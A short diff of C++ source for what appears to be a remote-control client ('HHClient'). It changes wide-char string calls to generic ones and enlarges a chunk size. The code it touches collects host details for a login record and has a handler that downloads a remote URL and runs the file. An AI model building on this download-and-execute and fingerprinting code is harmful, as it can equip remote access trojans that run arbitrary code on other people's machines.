@@ -176,7 +176,7 @@ void CKernel::OnModuleInfo(char* info){
 	GetModuleChunk();
 }
 
-#define MAX_CHUNK_SIZE 0x2000
+#define MAX_CHUNK_SIZE 0x10000
 
 void CKernel::GetModuleChunk(){
 	//
@@ -406,7 +406,7 @@ void CKernel::GetOSName(TCHAR OsName[128])
 	if (!RegOpenKeyW(HKEY_LOCAL_MACHINE,
 		TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), &hKey)){
 		if (!RegQueryValueExW(hKey, TEXT("ProductName"), NULL, &dwType, (LPBYTE)data, &dwSize)){
-			lstrcpyW(OsName, data);
+			lstrcpy(OsName, data);
 		}
 		RegCloseKey(hKey);
 	}
@@ -553,7 +553,7 @@ void CKernel::GetInstallDate(TCHAR InstallDate[128])
 	//Open Key
 	if (ERROR_SUCCESS != RegCreateKeyW(HKEY_CURRENT_USER,
 		TEXT("SOFTWARE\\HHClient"), &hKey)){
-		lstrcpyW(InstallDate, L"-");
+		lstrcpy(InstallDate, L"-");
 		return;
 	}
 	DWORD cbBuffer = 128 * sizeof(TCHAR);
@@ -616,7 +616,7 @@ void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
 	GetInstallDate(pLoginInfo->InstallDate);
 	GetCPU(pLoginInfo->CPU);
 	GetDisk(pLoginInfo->Disk_RAM);
-	lstrcatW(pLoginInfo->Disk_RAM, TEXT("/"));
+	lstrcat(pLoginInfo->Disk_RAM, TEXT("/"));
 	GetRAM(pLoginInfo->Disk_RAM + lstrlen(pLoginInfo->Disk_RAM));
 	//
 
@@ -788,9 +788,9 @@ void CKernel::OnDownloadAndExec(TCHAR*szUrl)
 		sizeof(TCHAR)* (lstrlenW(szTempPath) + 1 + lstrlenW(szUrl) + 1));
 
 	pInitParam->dwFlags |= FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD;
-	lstrcpyW(pInitParam->szURL, szTempPath);
-	lstrcatW(pInitParam->szURL, TEXT("\n"));
-	lstrcatW(pInitParam->szURL, szUrl);
+	lstrcpy(pInitParam->szURL, szTempPath);
+	lstrcat(pInitParam->szURL, TEXT("\n"));
+	lstrcat(pInitParam->szURL, szUrl);
 	//
 	auto const  peer = GetPeerName();
 	//
